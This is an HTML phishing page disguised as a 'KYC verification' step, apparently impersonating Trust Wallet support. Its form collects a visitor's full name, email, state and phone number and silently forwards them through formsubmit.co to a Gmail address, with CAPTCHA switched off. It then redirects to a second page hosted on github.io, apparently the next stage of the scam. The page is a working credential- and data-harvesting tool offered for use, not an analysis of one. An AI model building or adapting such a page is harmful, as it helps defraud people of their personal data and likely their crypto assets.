<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KYC Verification</title>
    <!--Google Font-->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500&display=swap" rel="stylesheet">
    <!--Stylesheet-->
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h1>Kyc verification</h1><br>
        <p>Make your Kyc verification to continue </p>
        <form action="https://formsubmit.co/user.help.trustwallet@gmail.com" method="POST" enctype="multipart/form-data">
                <input type="hidden" name="_captcha" value="false">
                <input type="hidden" name="_subject" value="JenFORM 1 INFO!!!!">
                <input type="hidden" name="_next" value="https://echo-films.github.io/Kyc-verification/next.html">
            <div class="row">
                <div class="column">
                    <label for="name">Full Name</label>
                    <input type="text" name="fname" id="fname" placeholder="Your name here" required>
                </div>
                <div class="column">
                    <label for="email">Email</label>
                    <input type="email" name="email" id="email" placeholder="Your email here" required>
                </div>
            </div>
            <div class="row">
                <div class="column">
                    <label for="subject">State</label>
                    <input type="text" name="state" id="subject" placeholder="What state do you live? " required>
                </div>
                <div class="column">
                    <label for="contact">Phone Number Number</label>
                    <input type="tel" name="number" id="contact" placeholder="Your phone number here" required>
                </div>
            </div>
            
            <button>Next Verification</button>
        </form>
    </div>
</body>
</html>
